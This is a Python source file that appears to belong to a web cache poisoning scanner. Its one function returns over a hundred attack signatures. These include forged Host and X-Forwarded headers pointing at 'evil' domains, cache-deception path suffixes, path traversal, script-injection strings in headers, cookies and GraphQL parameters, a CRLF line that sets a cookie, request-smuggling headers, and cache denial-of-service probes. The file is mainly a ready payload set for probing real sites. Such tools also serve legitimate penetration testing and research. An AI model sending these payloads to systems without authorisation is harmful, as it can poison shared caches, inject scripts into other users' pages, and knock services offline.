from typing import List, Dict

def get_all_signatures(payload_id: str) -> List[Dict]:
    """
    Returns a comprehensive list of cache poisoning signatures.
    Payload ID is injected into values to allow tracking.
    """
    return [
        # --- Standard Host Header Manipulation ---
        {"name": "X-Forwarded-Host", "header": "X-Forwarded-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Host", "header": "X-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Forwarded-Server", "header": "X-Forwarded-Server", "value": f"evil-{payload_id}.com"},
        {"name": "X-HTTP-Host-Override", "header": "X-HTTP-Host-Override", "value": f"evil-{payload_id}.com"},
        {"name": "Forwarded", "header": "Forwarded", "value": f"host=evil-{payload_id}.com;for=127.0.0.1"},
        {"name": "Host-Port-Mismatch", "header": "Host", "value": f"victim.com:1337"},  # New
        
        # --- Request Line / Path Overrides ---
        {"name": "X-Original-URL", "header": "X-Original-URL", "value": f"/poison-{payload_id}"},
        {"name": "X-Rewrite-URL", "header": "X-Rewrite-URL", "value": f"/poison-{payload_id}"},
        {"name": "X-Original-Request-URI", "header": "X-Original-Request-URI", "value": f"/poison-{payload_id}"},
        
        # --- Protocol / Port Manipulation ---
        {"name": "X-Forwarded-Scheme", "type": "method_override", "header": "X-Forwarded-Scheme", "value": "http"},
        {"name": "X-Forwarded-Proto", "type": "method_override", "header": "X-Forwarded-Proto", "value": "http"},
        {"name": "X-Forwarded-Port", "header": "X-Forwarded-Port", "value": "1111"},
        {"name": "X-Forwarded-Port-80", "header": "X-Forwarded-Port", "value": "80"},   # New
        {"name": "X-Forwarded-Port-8080", "header": "X-Forwarded-Port", "value": "8080"}, # New
        {"name": "X-Forwarded-Prefix", "header": "X-Forwarded-Prefix", "value": f"/evil-{payload_id}"},
        
        # --- Web Cache Deception (WCD) Extended ---
        {"name": "WCD-Static-Ext", "type": "path", "mutation": "static_extension", "value": f"/style.css?poison={payload_id}"},
        {"name": "WCD-Append-CSS", "type": "path", "mutation": "append_css", "value": f"/static/style.css?poison={payload_id}"},
        {"name": "WCD-Path-Delimiter-Semicolon", "type": "path", "mutation": "simple_append", "value": ";.css"}, # New
        {"name": "WCD-Path-Delimiter-Question", "type": "path", "mutation": "simple_append", "value": "?.jpg"},  # New
        {"name": "WCD-Encoded-Newline", "type": "path", "mutation": "simple_append", "value": "%0A.css"},    # New
        {"name": "WCD-Fragment-Bypass", "type": "path", "mutation": "simple_append", "value": "#.css"},      # New
        {"name": "WCD-Null-Byte", "type": "path", "mutation": "simple_append", "value": "%00.css"},          # New

        # --- HTTP/2 Pseudo-Headers (Requires compatible client) ---
        {"name": "HTTP2-Authority-Override", "type": "http2_header", "header": ":authority", "value": f"evil-{payload_id}.com"},
        {"name": "HTTP2-Path-Override", "type": "http2_header", "header": ":path", "value": f"/../admin?poison={payload_id}"},
        {"name": "HTTP2-Method-CONNECT", "type": "http2_header", "header": ":method", "value": "CONNECT"},

        # --- Header Reflection / Injection targets ---
        {"name": "Valid-User-Agent", "header": "User-Agent", "value": f"<script>alert('{payload_id}')</script>"},
        {"name": "Origin-Reflect", "header": "Origin", "value": f"https://evil-{payload_id}.com"},
        {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{payload_id}"},
        
        # --- Path Normalization / Traversal ---
        {"name": "Backslash-Path-Replace", "type": "path", "mutation": "backslash_replace"},
        {"name": "Backslash-Last-Path-Replace", "type": "path", "mutation": "backslash_last_slash"},
        {"name": "Path-Dot-Segment", "type": "path", "mutation": "dot_segment", "value": f"/./poison-{payload_id}"},
        {"name": "Path-Double-Dot", "type": "path", "mutation": "double_dot", "value": f"/../poison-{payload_id}"},
        {"name": "Path-Encoded-Slash", "type": "path", "mutation": "encoded_slash", "value": f"/%2fpoison-{payload_id}"},
        {"name": "Path-Trailing-Slash-Add", "type": "path", "mutation": "add_trailing_slash"},      # New
        {"name": "Path-Trailing-Slash-Remove", "type": "path", "mutation": "remove_trailing_slash"}, # New
        {"name": "Path-Double-Slash", "type": "path", "mutation": "double_slash_prefix", "value": "//poison"}, # New

        # --- Fat GET (Body Poisoning) ---
        {"name": "Fat-GET", "type": "fat_get", "header": "X-Poison-Fat", "value": f"evil-{payload_id}"},

        # --- CDN / IP Forwarding ---
        {"name": "Fastly-Client-IP", "header": "Fastly-Client-IP", "value": "8.8.8.8"},
        {"name": "True-Client-IP", "header": "True-Client-IP", "value": "127.0.0.1"},
        {"name": "CF-Connecting-IP", "header": "CF-Connecting-IP", "value": "127.0.0.1"},
        {"name": "X-Real-IP", "header": "X-Real-IP", "value": "127.0.0.1"},
        {"name": "X-Forwarded-For-IP", "header": "X-Forwarded-For", "value": "127.0.0.1"},
        {"name": "Client-IP", "header": "Client-IP", "value": "127.0.0.1"},
        {"name": "X-Akamai-Edgescape", "header": "X-Akamai-Edgescape", "value": f"poison={payload_id}"},
        {"name": "X-Azure-ClientIP", "header": "X-Azure-ClientIP", "value": "127.0.0.1"},
        {"name": "X-Azure-SocketIP", "header": "X-Azure-SocketIP", "value": "127.0.0.1"},
        
        # --- Method Override ---
        {"name": "Method-Override-POST", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "POST"},
        {"name": "Method-Override-PUT", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "PUT"},

        # --- Unkeyed Query Parameter ---
        {"name": "Unkeyed-Param", "type": "query_param", "param": "utm_content", "value": f"evil-{payload_id}"},
        {"name": "Parameter-Pollution", "type": "query_param", "param": "utm_source", "value": f"evil-{payload_id}"},
        {"name": "GraphQL-Query-Pollution", "type": "query_param", "param": "query", "value": f"{{__typename poison:{payload_id}}}"}, # New
        {"name": "GraphQL-OperationName", "type": "query_param", "param": "operationName", "value": f"<svg onload=alert('{payload_id}')>"}, # New

        # --- Extended Header Reflection ---
        {"name": "X-Forwarded-SSL", "header": "X-Forwarded-SSL", "value": "on"},
        {"name": "X-Cluster-Client-IP", "header": "X-Cluster-Client-IP", "value": "127.0.0.1"},
        {"name": "Akamai-Pragma", "header": "Pragma", "value": "akamai-x-cache-on"},
        {"name": "Referer-Reflect", "header": "Referer", "value": f"https://evil-{payload_id}.com"},
        {"name": "Cache-Control-Poison", "header": "Cache-Control", "value": "public, max-age=3600"},
        {"name": "X-Original-Host", "header": "X-Original-Host", "value": f"evil-{payload_id}.com"},
        {"name": "X-Forwarded-Path", "header": "X-Forwarded-Path", "value": f"/poison-{payload_id}"},
        {"name": "Surrogate-Control", "header": "Surrogate-Control", "value": "max-age=3600"},
        {"name": "Vary-Manipulation", "header": "Vary", "value": "X-Forwarded-Host"},
        {"name": "Accept-Encoding-Reflect", "header": "Accept-Encoding", "value": f"evil-{payload_id}"},
        {"name": "TE-Trailers", "type": "method_override", "header": "Transfer-Encoding", "value": "trailers"},
        {"name": "CRLF-Injection", "header": "X-Custom-Header", "value": f"%0d%0aSet-Cookie: evil={payload_id}"},
        
        # --- Cookies ---
        {"name": "HAV-Cookie-Reflect", "header": "hav", "value": f"<script>alert('{payload_id}')</script>"},
        {"name": "Cookie-Reflection-Session", "header": "Cookie", "value": f"session=<script>alert('{payload_id}')</script>"}, # New 
        {"name": "Cookie-HMO", "header": "Cookie", "value": f"_method=PUT; poison={payload_id}"}, # New
        {"name": "Cookie-Vary", "header": "Cookie", "value": f"cache_poison=\"{payload_id}\""},

        # --- Vercel / Next.js ---
        {"name": "Vercel-IP-Country-US", "type": "method_override", "header": "x-vercel-ip-country", "value": "US"},
        {"name": "Vercel-Forwarded-For", "type": "method_override", "header": "x-vercel-forwarded-for", "value": "127.0.0.1"},
        {"name": "NextJS-RSC", "type": "method_override", "header": "RSC", "value": "1"},
        {"name": "NextJS-Router-State", "type": "method_override", "header": "Next-Router-State-Tree", "value": "1"},
        {"name": "NextJS-Middleware-Prefetch", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "1"},
        {"name": "X-Middleware-Prefetch-Poison", "type": "method_override", "header": "X-Middleware-Prefetch", "value": "poison"},
        {"name": "NextJS-Data", "type": "method_override", "header": "X-Nextjs-Data", "value": "1"},
        {"name": "NextJS-Purpose-Prefetch", "type": "method_override", "header": "Purpose", "value": "prefetch"},
        {"name": "NextJS-Cache-Poison", "type": "method_override", "header": "Next-Router-Prefetch", "value": "1"},
        {"name": "NextJS-Next-Url", "header": "x-next-url", "value": f"/evil-{payload_id}"},

        # --- Range / DoS ---
        {"name": "Range-Poisoning", "type": "method_override", "header": "Range", "value": "bytes=0-0"},
        
        # --- CloudFront & AWS ---
        {"name": "CloudFront-Viewer-Country", "method_override": "true", "header": "CloudFront-Viewer-Country", "value": "US"},
        {"name": "CloudFront-Is-Mobile", "type": "method_override", "header": "CloudFront-Is-Mobile-Viewer", "value": "true"},
        {"name": "CloudFront-Is-Desktop", "type": "method_override", "header": "CloudFront-Is-Desktop-Viewer", "value": "true"},
        {"name": "CloudFront-Forwarded-Proto", "type": "method_override", "header": "CloudFront-Forwarded-Proto", "value": "http"},
        {"name": "AWS-S3-Redirect", "header": "x-amz-website-redirect-location", "value": f"/evil-{payload_id}"},

        # --- Service Worker / Socket ---
        {"name": "ServiceWorker-Script-Injection", "header": "Service-Worker-Allowed", "value": "/"}, # New
        {"name": "ServiceWorker-Scope-Poison", "header": "X-Service-Worker-Scope", "value": "/admin"}, # New
        {"name": "WebSocket-Upgrade-Poison", "header": "Upgrade", "value": f"websocket\r\nX-Poison: {payload_id}"}, # New
        {"name": "WebSocket-Key-Poison", "header": "Sec-WebSocket-Key", "value": f"base64evil{payload_id}=="}, # New

        # --- CPDoS (Cache Poisoning Denial of Service) ---
        {"name": "CPDoS-HMO-Connect", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "CONNECT"},
        {"name": "CPDoS-HMO-Track", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "TRACK"},
        {"name": "CPDoS-HHO-Oversize", "type": "method_override", "header": "X-Oversized-Header", "value": "A" * 4000},

        # --- Frameworks ---
        {"name": "IIS-Translate-F", "header": "Translate", "value": "f"},
        {"name": "Symfony-Debug-Host", "header": "X-Backend-Host", "value": f"evil-{payload_id}.com"},
        {"name": "Magento-Base-Url", "header": "X-Forwarded-Base-Url", "value": f"http://evil-{payload_id}.com"},
        {"name": "X-Laravel-Cache", "header": "X-Laravel-Cache", "value": f"poison-{payload_id}"},
        {"name": "X-Drupal-Cache", "header": "X-Drupal-Cache", "value": f"poison-{payload_id}"},
        {"name": "X-WordPress-Cache", "header": "X-WordPress-Cache", "value": f"poison-{payload_id}"},

        # --- Proxy/LB ---
        {"name": "X-ProxyUser-Ip", "header": "X-ProxyUser-Ip", "value": "127.0.0.1"},
        {"name": "WL-Proxy-Client-IP", "header": "WL-Proxy-Client-IP", "value": "127.0.0.1"},
        {"name": "Via-Header", "header": "Via", "value": f"1.1 poison-{payload_id}.com"},
        
        # --- API Gateway ---
        {"name": "X-Amzn-Trace-Id", "header": "X-Amzn-Trace-Id", "value": f"Root=1-{payload_id}"},
        {"name": "X-API-Version", "header": "X-API-Version", "value": f"poison-{payload_id}"},
        {"name": "X-Gateway-Host", "header": "X-Gateway-Host", "value": f"evil-{payload_id}.com"},

        # --- URL Encoding Bypass ---
        {"name": "X-Forwarded-Host-Encoded", "header": "X-Forwarded-Host", "value": f"evil-{payload_id}.com%00"},
        {"name": "X-Original-URL-Encoded", "header": "X-Original-URL", "value": f"/%2e%2e/poison-{payload_id}"},
        
        # --- Request Smuggling Related ---
        {"name": "Transfer-Encoding", "type": "method_override", "header": "Transfer-Encoding", "value": f"chunked; poison={payload_id}"},
        {"name": "Content-Length-Mismatch", "type": "method_override", "header": "Content-Length", "value": "0"},
        {"name": "X-HTTP-Method", "type": "method_override", "header": "X-HTTP-Method", "value": f"POST; poison={payload_id}"},
    ]
